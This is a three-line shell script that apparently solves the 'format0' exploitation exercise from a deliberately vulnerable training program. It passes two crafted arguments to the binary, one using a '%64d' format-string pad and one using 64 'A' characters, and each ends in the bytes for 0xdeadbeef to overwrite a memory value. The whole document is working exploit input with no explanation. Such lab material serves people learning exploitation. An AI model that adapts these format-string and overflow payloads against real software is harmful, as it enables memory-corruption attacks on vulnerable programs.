#! /bin/sh
./format0 %64d`python -c 'print("\xef\xbe\xad\xde")'`
./format0 `python -c 'print("A"*64 + "\xef\xbe\xad\xde")'`  
